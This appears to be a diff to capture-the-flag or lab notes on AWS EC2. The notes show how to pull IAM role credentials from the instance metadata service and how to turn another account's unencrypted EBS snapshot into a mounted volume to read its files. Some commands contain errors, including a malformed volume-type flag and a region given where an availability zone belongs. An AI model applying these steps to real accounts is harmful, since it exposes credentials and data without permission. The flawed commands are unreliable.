@@ -58,6 +58,66 @@ role_name = $( curl -s -H "X-aws-ec2-metadata-token:$TOKEN" http://169.254.169.2
 curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/${role_name}
 ```
 
+## EC2 Networking & Storage
+- EC2 Networking revolves around **Elastic Network Interface (ENI)**. Each EC2 instance has at least 1 ENI, which has at least 1 Security Group attached to it. We can try the following command
+
+```bash
+aws ec2 describe-network-interfaces | jq '.NetworkInterfaces[0]'
+```
+
+![image](https://github.com/user-attachments/assets/67e65889-db9d-42e1-82c5-26e083e1f7fb)
+
+- EC2 Storage uses **Amazon Elastic BLock Store (EBS)** as the hard disk storage for EC2 instances.
+
+```bash
+aws ec2 describe-snapshots --snapshot-ids $SNAP_ID
+```
+![image](https://github.com/user-attachments/assets/395c4c22-0d7f-4c02-9e06-c8eadb1c0c9c)
+
+- From the above screenshot, we see there are two important pieces of information: the volume is not encrypted and the Owner's id is `019181489476`.
+- To create a volume from this snapshot, we need the AZ to be in the same region as the EC2 machine's.
+
+```bash
+TOKEN=`curl -s -X PUT "http://169.254.169.254/latest/api/token" -H  "X-aws-ec2-metadata-token-ttl-seconds:21600"`
+
+curl -s -H "X-aws-ec2-metadata-token:$TOKEN" http://169.254.169.254/latest/meta-data/placement/availability-zone
+```
+
+- Once obtaining the AZ, we can preoceed to create the volume from the snapshot
+
+```bash
+aws ec2 create-volume --snapshot-id $SNAP_ID --volume-type- gp3 --region $REGION --availability-zone $REGION
+```
+
+![image](https://github.com/user-attachments/assets/49d91901-e1ef-4908-a493-89fe81713e22)
+
+-We'll get the Volume ID, which can be used to attach to our instance:
+
+```bash
+# Retrieve Instance ID
+instance_id=$( curl -H "X-aws-ec2-metadata-token: $TOKEN" -s http://169.254.169.254/latest/meta-data/instance-id)
+
+# Attacht the Volume to the instance
+aws ec2 attach-volume --region $REGION --device /dev/sdh --instance-id $instance_id --volume-id $VOLUME_ID 
+```
+
+- Run `sudo fdisk -l` to confirm the volume has been attached.\
+
+  ![image](https://github.com/user-attachments/assets/157c8acd-193f-4541-adb3-1ae1118dfd3e)
+
+- Mount the disk:
+
+```bash
+sudo mkdir /snapshot-recovery
+sudo mount /dev/nvme1n1 /snapshot-recovery
+ls /snapshot-recovery
+cat /snapshot-recovery/flag.txt
+```
+
+![image](https://github.com/user-attachments/assets/49e0eda7-65ff-4c5d-9657-e6aebd2b3ed3)
+
+
+
 
 
 
